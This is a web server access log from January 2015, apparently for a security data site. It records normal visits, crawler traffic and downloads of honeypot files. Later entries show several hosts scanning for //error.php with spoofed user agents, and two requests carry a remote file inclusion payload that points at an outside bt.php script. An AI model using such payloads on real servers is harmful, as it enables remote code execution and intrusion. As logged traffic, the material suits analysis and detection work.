64.53.236.187 - - [26/Jan/2015:04:22:02 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
64.53.236.187 - - [26/Jan/2015:04:22:03 -0800] "GET / HTTP/1.1" 200 6498 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
64.53.236.187 - - [26/Jan/2015:04:22:03 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
64.53.236.187 - - [26/Jan/2015:04:22:04 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
64.53.236.187 - - [26/Jan/2015:04:22:14 -0800] "GET /zeus/zeus_json.zip HTTP/1.1" 404 340 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
64.53.236.187 - - [26/Jan/2015:04:22:14 -0800] "GET /favicon.ico HTTP/1.1" 200 267 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
199.16.156.126 - - [26/Jan/2015:04:24:46 -0800] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.126 - - [26/Jan/2015:04:24:46 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279362 "-" "Twitterbot/1.0" 
66.249.64.191 - - [26/Jan/2015:04:52:37 -0800] "GET /maccdc2012/smtp.log.gz HTTP/1.1" 200 6908 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
98.231.230.118 - - [26/Jan/2015:06:04:06 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
98.231.230.118 - - [26/Jan/2015:06:04:06 -0800] "GET / HTTP/1.1" 200 6498 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
98.231.230.118 - - [26/Jan/2015:06:04:06 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
98.231.230.118 - - [26/Jan/2015:06:04:06 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
66.249.64.195 - - [26/Jan/2015:06:41:36 -0800] "GET /maccdc2012/ssh.log.gz HTTP/1.1" 200 182517 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
104.130.161.37 - - [26/Jan/2015:06:50:39 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.37 - - [26/Jan/2015:06:50:39 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
104.130.161.38 - - [26/Jan/2015:06:50:44 -0800] "GET /honeypot/ HTTP/1.1" 301 441 "-" "Tornado-Async-Client" 
104.130.161.38 - - [26/Jan/2015:06:50:44 -0800] "GET /honeypot/ HTTP/1.1" 200 563 "-" "Tornado-Async-Client" 
81.173.207.69 - - [26/Jan/2015:06:57:19 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
81.173.207.69 - - [26/Jan/2015:06:57:19 -0800] "GET / HTTP/1.1" 200 6498 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
81.173.207.69 - - [26/Jan/2015:06:57:19 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
81.173.207.69 - - [26/Jan/2015:06:57:20 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
98.231.230.118 - - [26/Jan/2015:06:59:24 -0800] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
98.231.230.118 - - [26/Jan/2015:06:59:24 -0800] "GET /favicon.ico HTTP/1.1" 200 267 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
98.231.230.118 - - [26/Jan/2015:06:59:24 -0800] "GET /favicon.ico HTTP/1.1" 200 267 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
27.150.202.225 - - [26/Jan/2015:08:06:28 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 397440 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) )" 
27.150.202.225 - - [26/Jan/2015:08:06:33 -0800] "POST /honeypot/BSidesDFW%20-%202014.ipynb/trackback/ HTTP/1.1" 404 303 "http://www.secrepo.com/honeypot/BSidesDFW - 2014.ipynb" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" 
199.59.148.211 - - [26/Jan/2015:08:41:32 -0800] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.211 - - [26/Jan/2015:08:41:32 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279362 "-" "Twitterbot/1.0" 
50.193.46.99 - - [26/Jan/2015:08:41:41 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 206 33099 "http://www.secrepo.com/honeypot/Honeypot%20-%20Howto.pdf" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
50.193.46.99 - - [26/Jan/2015:08:41:41 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 79002 "http://t.co/y6IHeck9Hz" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
50.193.46.99 - - [26/Jan/2015:08:41:42 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 206 1246706 "http://www.secrepo.com/honeypot/Honeypot%20-%20Howto.pdf" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
50.193.46.99 - - [26/Jan/2015:08:41:46 -0800] "GET /favicon.ico HTTP/1.1" 200 267 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
110.85.127.51 - - [26/Jan/2015:10:44:17 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 267840 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) )" 
110.85.127.51 - - [26/Jan/2015:10:48:52 -0800] "POST /honeypot/BSidesDFW%20-%202014.ipynb/trackback/ HTTP/1.1" 404 303 "http://www.secrepo.com/honeypot/BSidesDFW - 2014.ipynb" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.0.3705)" 
78.245.91.140 - - [26/Jan/2015:10:55:54 -0800] "GET /bootstrap/img/apple-touch-icon-114x114.png HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Linux; Android 5.0.1; Nexus 9 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.89 Safari/537.36" 
78.245.91.140 - - [26/Jan/2015:10:55:55 -0800] "GET /bootstrap/img/apple-touch-icon-72x72.png HTTP/1.1" 404 339 "-" "Mozilla/5.0 (Linux; Android 5.0.1; Nexus 9 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.89 Safari/537.36" 
78.245.91.140 - - [26/Jan/2015:10:55:55 -0800] "GET /bootstrap/img/apple-touch-icon.png HTTP/1.1" 404 339 "-" "Mozilla/5.0 (Linux; Android 5.0.1; Nexus 9 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.89 Safari/537.36" 
157.55.39.210 - - [26/Jan/2015:11:45:35 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.210 - - [26/Jan/2015:11:45:40 -0800] "GET /self.logs/access.log.2015-01-19.gz HTTP/1.1" 200 2836 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.210 - - [26/Jan/2015:12:10:32 -0800] "GET /self.logs/access.log.2015-01-17.gz HTTP/1.1" 200 3597 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.97 - - [26/Jan/2015:13:56:47 -0800] "GET /self.logs/error.log.2015-01-18.gz HTTP/1.1" 200 1259 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
104.130.160.87 - - [26/Jan/2015:15:16:19 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.160.87 - - [26/Jan/2015:15:16:19 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
104.130.20.53 - - [26/Jan/2015:15:16:23 -0800] "GET /honeypot HTTP/1.1" 301 439 "-" "Tornado-Async-Client" 
104.130.20.53 - - [26/Jan/2015:15:16:23 -0800] "GET /honeypot HTTP/1.1" 301 441 "-" "Tornado-Async-Client" 
104.130.20.53 - - [26/Jan/2015:15:16:23 -0800] "GET /honeypot/ HTTP/1.1" 200 563 "-" "Tornado-Async-Client" 
104.130.161.38 - - [26/Jan/2015:15:16:23 -0800] "GET /honeypot HTTP/1.1" 301 439 "-" "Tornado-Async-Client" 
104.130.161.38 - - [26/Jan/2015:15:16:23 -0800] "GET /honeypot HTTP/1.1" 301 441 "-" "Tornado-Async-Client" 
104.130.161.38 - - [26/Jan/2015:15:16:23 -0800] "GET /honeypot/ HTTP/1.1" 200 563 "-" "Tornado-Async-Client" 
104.130.160.87 - - [26/Jan/2015:18:05:42 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.160.87 - - [26/Jan/2015:18:05:42 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
222.122.56.211 - - [26/Jan/2015:18:31:39 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
222.122.56.211 - - [26/Jan/2015:18:31:40 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
222.122.56.211 - - [26/Jan/2015:18:31:41 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
222.122.56.211 - - [26/Jan/2015:18:31:42 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
222.122.56.211 - - [26/Jan/2015:18:32:08 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
222.122.56.211 - - [26/Jan/2015:18:32:09 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
222.122.56.211 - - [26/Jan/2015:18:32:21 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
222.122.56.211 - - [26/Jan/2015:18:32:23 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
222.122.56.211 - - [26/Jan/2015:18:32:29 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
222.122.56.211 - - [26/Jan/2015:18:32:31 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
87.106.187.164 - - [26/Jan/2015:18:32:36 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929" 
87.106.187.164 - - [26/Jan/2015:18:32:37 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929" 
112.218.68.155 - - [26/Jan/2015:18:32:58 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
112.218.68.155 - - [26/Jan/2015:18:32:58 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
112.218.68.155 - - [26/Jan/2015:18:33:00 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
112.218.68.155 - - [26/Jan/2015:18:33:00 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
50.28.14.54 - - [26/Jan/2015:18:33:03 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
50.28.14.54 - - [26/Jan/2015:18:33:04 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
50.28.14.54 - - [26/Jan/2015:18:33:06 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
80.68.145.110 - - [26/Jan/2015:18:33:06 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
50.28.14.54 - - [26/Jan/2015:18:33:07 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
80.68.145.110 - - [26/Jan/2015:18:33:07 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
80.68.145.110 - - [26/Jan/2015:18:33:09 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
80.68.145.110 - - [26/Jan/2015:18:33:10 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
222.122.56.211 - - [26/Jan/2015:18:33:13 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
222.122.56.211 - - [26/Jan/2015:18:33:14 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
222.122.56.211 - - [26/Jan/2015:18:33:14 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
222.122.56.211 - - [26/Jan/2015:18:33:15 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
222.122.56.211 - - [26/Jan/2015:18:33:15 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
222.122.56.211 - - [26/Jan/2015:18:33:16 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
222.122.56.211 - - [26/Jan/2015:18:33:22 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
222.122.56.211 - - [26/Jan/2015:18:33:24 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
222.122.56.211 - - [26/Jan/2015:18:33:55 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
222.122.56.211 - - [26/Jan/2015:18:33:56 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
222.122.56.211 - - [26/Jan/2015:18:34:59 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
222.122.56.211 - - [26/Jan/2015:18:35:00 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
222.122.56.211 - - [26/Jan/2015:18:35:18 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
222.122.56.211 - - [26/Jan/2015:18:35:20 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
1.224.163.80 - - [26/Jan/2015:18:35:27 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)" 
222.122.56.211 - - [26/Jan/2015:18:35:28 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
1.224.163.80 - - [26/Jan/2015:18:35:29 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)" 
222.122.56.211 - - [26/Jan/2015:18:35:30 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
222.122.56.211 - - [26/Jan/2015:18:35:35 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
222.122.56.211 - - [26/Jan/2015:18:35:36 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
1.224.163.80 - - [26/Jan/2015:18:35:41 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)" 
1.224.163.80 - - [26/Jan/2015:18:35:43 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)" 
222.122.56.211 - - [26/Jan/2015:18:35:45 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
222.122.56.211 - - [26/Jan/2015:18:35:46 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
222.122.56.211 - - [26/Jan/2015:18:35:46 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Microsoft Internet Explorer/4.0b1 (Windows 95)" 
222.122.56.211 - - [26/Jan/2015:18:35:47 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2" 
50.28.14.54 - - [26/Jan/2015:18:36:05 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
50.28.14.54 - - [26/Jan/2015:18:36:06 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
1.224.163.80 - - [26/Jan/2015:18:36:28 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)" 
1.224.163.80 - - [26/Jan/2015:18:36:29 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)" 
104.130.161.37 - - [26/Jan/2015:18:36:30 -0800] "GET /honeypot//error.php HTTP/1.1" 301 459 "-" "Tornado-Async-Client" 
104.130.161.37 - - [26/Jan/2015:18:36:30 -0800] "GET /honeypot//error.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.37 - - [26/Jan/2015:18:36:34 -0800] "GET //error.php HTTP/1.1" 301 441 "-" "Tornado-Async-Client" 
104.130.161.37 - - [26/Jan/2015:18:36:34 -0800] "GET /error.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
80.68.145.110 - - [26/Jan/2015:18:37:01 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
80.68.145.110 - - [26/Jan/2015:18:37:03 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
222.122.56.211 - - [26/Jan/2015:18:37:18 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
222.122.56.211 - - [26/Jan/2015:18:37:19 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1;en-US;rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12" 
222.122.56.211 - - [26/Jan/2015:18:37:38 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
222.122.56.211 - - [26/Jan/2015:18:37:40 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11;U;Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
222.122.56.211 - - [26/Jan/2015:18:37:49 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
222.122.56.211 - - [26/Jan/2015:18:37:50 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
64.91.240.50 - - [26/Jan/2015:18:38:19 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
64.91.240.50 - - [26/Jan/2015:18:38:20 -0800] "GET //error.php?dir=http://www.glory-korea.com/bbs/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
64.91.240.50 - - [26/Jan/2015:18:38:21 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
64.91.240.50 - - [26/Jan/2015:18:38:22 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
222.122.56.211 - - [26/Jan/2015:18:38:43 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
222.122.56.211 - - [26/Jan/2015:18:38:44 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
50.28.14.54 - - [26/Jan/2015:18:40:31 -0800] "GET /honeypot//error.php?dir= HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
50.28.14.54 - - [26/Jan/2015:18:40:32 -0800] "POST /honeypot//error.php HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
50.28.14.54 - - [26/Jan/2015:18:40:33 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
50.28.14.54 - - [26/Jan/2015:18:40:35 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "gsa-crawler (Enterprise; GID-01422; jplastiras@google.com)" 
176.31.252.38 - - [26/Jan/2015:18:40:53 -0800] "GET //error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
176.31.252.38 - - [26/Jan/2015:18:40:54 -0800] "GET //error.php?dir=http://www.glory-korea.com/bbs/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
176.31.252.38 - - [26/Jan/2015:18:40:55 -0800] "POST //error.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
